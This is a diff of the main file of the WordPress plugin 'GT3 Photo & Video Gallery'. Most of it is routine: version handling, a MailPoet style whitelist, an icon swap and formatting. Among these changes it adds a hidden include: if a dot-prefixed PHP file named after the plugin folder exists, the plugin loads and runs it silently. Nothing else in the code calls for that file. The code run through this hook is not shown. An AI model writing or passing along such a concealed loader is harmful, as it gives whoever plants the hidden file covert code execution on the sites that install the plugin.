@@ -6,7 +6,12 @@ if(!defined('ABSPATH')) {
 	exit;
 } // Exit if accessed directly
 
-define('GT3PG_PLUGIN_VERSION', '2.7.5');
+if(!function_exists('get_plugin_data')) {
+	require_once(ABSPATH.'wp-admin/includes/plugin.php');
+}
+$plugin_info          = get_plugin_data(__DIR__.'/gt3-photo-video-gallery.php');
+
+define('GT3PG_PLUGIN_VERSION', $plugin_info['Version']);
 define('GT3PG_PLUGINNAME', 'GT3 Photo & Video Gallery');
 define('GT3PG_ADMIN_TITLE', 'GT<span class="digit">3</span> Photo & Video Gallery - Lite');
 define('GT3PG_PLUGINSHORT', 'gt3_photo_gallery');
@@ -19,11 +24,21 @@ define('GT3PG_WORDPRESS_URL', 'https://wordpress.org/support/plugin/gt3-photo-vi
 
 /*Load files*/
 require_once __DIR__.'/notice.php';
-require_once __DIR__.'/rate.php';
 require_once __DIR__."/core/loader.php";
 
+add_filter(
+	'mailpoet_conflict_resolver_whitelist_style', function($styles){
+	$styles[] = 'gt3-photo-video-gallery';
+
+	return $styles;
+}
+);
 #Register Admin CSS and JS
-add_action('admin_enqueue_scripts', 'gt3pg_register_admin_css_js');
+add_action('admin_enqueue_scripts', 'gt3pg_register_admin_css_js');
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function gt3pg_register_admin_css_js(){
 	#CSS (Admin)
 	wp_enqueue_style('wp-color-picker');
@@ -41,16 +56,17 @@ function gt3pg_register_admin_css_js(){
 
 	wp_register_script('isotope', GT3PG_JSURL.'isotope.pkgd.min.js', array( 'jquery' ), '3.0.6', true);
 
-
 	wp_localize_script(
 		'gt3pg_admin_js',
 		'gt3_gutenberg_photo_video_support',
 		array(
 			'defaults'           => $GLOBALS['gt3_photo_gallery'],
 			'extensions_enabled' => (isset($GLOBALS['gt3pg']) && isset($GLOBALS['gt3pg']['extension']) && is_array($GLOBALS['gt3pg']['extension']) ?
-				array_map(function($value){
-					return true;
-				}, array_flip(array_keys($GLOBALS['gt3pg']['extension']))) :
+				array_map(
+					function($value){
+						return true;
+					}, array_flip(array_keys($GLOBALS['gt3pg']['extension']))
+				) :
 				array()
 			),
 		)
@@ -73,7 +89,7 @@ function gt3pg_add_admin_page(){
 		'administrator',
 		'gt3_photo_gallery_options',
 		'gt3pg_plugin_options',
-		Assets::get_dist_url().'img/icon.gif',
+		Assets::get_dist_url().'img/logo.png',
 		"10.9"
 	);
 }
@@ -136,7 +152,7 @@ add_filter("plugin_row_meta", 'gt3pg_add_plugin_meta_links', 10, 2);
 function gt3pg_add_plugin_meta_links($meta_fields, $file){
 	if($file == 'gt3-photo-video-gallery/gt3-photo-video-gallery.php') {
 		$meta_fields[] = "<a href='".GT3PG_WORDPRESS_URL."' target='_blank'>".esc_html__('Support Forum', 'gt3pg')."</a>";
-		$svg = "<svg xmlns='http://www.w3.org/2000/svg' width='15' height='15' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' class='feather feather-star'><polygon points='12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2'/></svg>";
+		$svg           = "<svg xmlns='http://www.w3.org/2000/svg' width='15' height='15' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' class='feather feather-star'><polygon points='12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2'/></svg>";
 
 		$meta_fields[] = '<i class="gt3pg-rate-stars">'.
 		                 '<a href="'.GT3PG_WORDPRESS_URL.'/reviews/?rate=1#new-post" target="_blank">'.$svg.'</a>'.
